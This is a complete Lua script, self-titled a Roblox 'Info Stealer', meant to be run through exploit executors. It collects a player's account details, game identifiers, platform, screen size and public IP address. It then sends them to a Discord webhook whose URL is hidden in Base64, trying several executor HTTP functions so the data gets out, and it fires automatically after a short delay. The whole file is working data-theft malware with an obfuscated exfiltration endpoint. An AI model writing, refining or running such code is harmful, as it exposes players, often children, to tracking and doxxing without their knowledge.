--[=[ Roblox Info Stealer – v1.3 (Universal HTTP)
      Automatically detects the executor's HTTP function.
      Sends data to Discord webhook.
]=]

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UIS = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Your new webhook (Base64-encoded)
local encoded_webhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyNzc5OTg5Nzc0MTMzMjYzMS9HSHlWbnVMSzdib0JIZUhqamdDclRBWWtrcXdzdTV5WnVWSW5ZU3lHUElOUG1aR2M5SXhSU3NVQ1liUEdYVXNOcmpnVQ=="

-- Decode Base64 (pure Lua)
local function base64_decode(data)
    local b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local lookup = {}
    for i = 1, #b64 do lookup[string.sub(b64, i, i)] = i - 1 end
    data = string.gsub(data, "[^" .. b64 .. "=]", "")
    local result = {}
    for i = 1, #data, 4 do
        local chunk = string.sub(data, i, i+3)
        local a = lookup[string.sub(chunk, 1, 1)] or 0
        local b = lookup[string.sub(chunk, 2, 2)] or 0
        local c = lookup[string.sub(chunk, 3, 3)] or 0
        local d = lookup[string.sub(chunk, 4, 4)] or 0
        local byte1 = (a * 4) + math.floor(b / 16)
        local byte2 = ((b % 16) * 16) + math.floor(c / 4)
        local byte3 = ((c % 4) * 64) + d
        table.insert(result, string.char(byte1))
        if string.sub(chunk, 3, 3) ~= "=" then table.insert(result, string.char(byte2)) end
        if string.sub(chunk, 4, 4) ~= "=" then table.insert(result, string.char(byte3)) end
    end
    return table.concat(result)
end

local WEBHOOK_URL = base64_decode(encoded_webhook)

-- Collect data
local function collectInfo()
    local data = {
        player = {
            userId = LocalPlayer.UserId,
            name = LocalPlayer.Name,
            displayName = LocalPlayer.DisplayName,
            accountAge = LocalPlayer.AccountAge,
            membership = tostring(LocalPlayer.MembershipType),
        },
        game = {
            placeId = game.PlaceId,
            jobId = game.JobId,
            gameId = game.GameId,
            creatorId = game.CreatorId,
            creatorType = game.CreatorType,
            name = game.Name,
        },
        client = {
            platform = tostring(UIS:GetPlatform()),
            screen = tostring(Camera.ViewportSize),
        },
        timestamp = os.time(),
    }
    pcall(function()
        local ip = HttpService:GetAsync("https://api.ipify.org?format=json")
        data.ip = ip
    end)
    return data
end

-- Universal HTTP send function
local function sendWebhook(payload)
    local json = HttpService:JSONEncode(payload)

    -- Try syn.request (Synapse X)
    if syn and syn.request then
        syn.request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json
        })
        return true
    end

    -- Try http_request (some executors)
    if http_request then
        http_request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json
        })
        return true
    end

    -- Try request (another common name)
    if request then
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json
        })
        return true
    end

    -- Fallback to HttpService:PostAsync (may be blocked)
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson, false)
    end)
    return true
end

-- Send data
local function sendData()
    local payload = collectInfo()
    sendWebhook(payload)
end

-- Execute after a short delay
task.wait(2)
sendData()
